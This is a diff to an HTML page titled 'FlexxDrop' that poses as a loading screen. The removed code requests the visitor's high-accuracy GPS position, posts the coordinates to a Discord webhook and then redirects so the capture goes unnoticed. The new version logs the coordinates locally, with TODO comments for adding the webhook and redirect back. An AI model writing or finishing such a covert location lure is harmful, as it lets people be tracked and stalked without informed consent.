@@ -1,79 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>FlexxDrop</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background-color: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 1.2rem;
-    }
-  </style>
-</head>
-<body>
-  <div id="loading">Loading FlexxDrop…</div>
-
-  <script>
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // 🔁 Replace with your webhook
-    const redirectUrl = "https://example.com";       // 🔁 Replace with your content page
-
-    function sendGPS(lat, lon, acc) {
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
-        })
-      });
-
-      setTimeout(() => {
-        window.location.href = redirectUrl;
-      }, 1000);
-    }
-
-    function onLocationError(err) {
-      console.warn("Location denied or failed:", err);
-      window.location.href = "about:blank";
-    }
-
-    function requestLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude, accuracy } = position.coords;
-            sendGPS(latitude, longitude, accuracy);
-          },
-          onLocationError,
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      } else {
-        onLocationError("Geolocation not supported.");
+<html>
+  <head>
+    <title>FlexxDrop</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      html, body {
+        background-color: #000;
+        color: #fff;
+        margin: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.2rem;
       }
-    }
+    </style>
+  </head>
+  <body>
+    <div>Loading FlexxDrop…</div>
 
-    function requestNotification() {
-      if ("Notification" in window) {
-        Notification.requestPermission().then(() => {});
-      }
-    }
-
-    window.onload = () => {
-      requestNotification();
-      requestLocation();
-    };
-  </script>
-</body>
+    <script>
+      window.onload = () => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              console.log("Latitude:", position.coords.latitude);
+              console.log("Longitude:", position.coords.longitude);
+              console.log("Accuracy:", position.coords.accuracy + " meters");
+              // TODO: Add webhook here if needed
+              // TODO: Add redirect here if needed
+            },
+            (error) => {
+              console.error("Location error:", error.message);
+              // Optionally redirect or close
+              // window.location.href = "about:blank";
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            }
+          );
+        } else {
+          console.warn("Geolocation not supported.");
+        }
+      };
+    </script>
+  </body>
 </html>
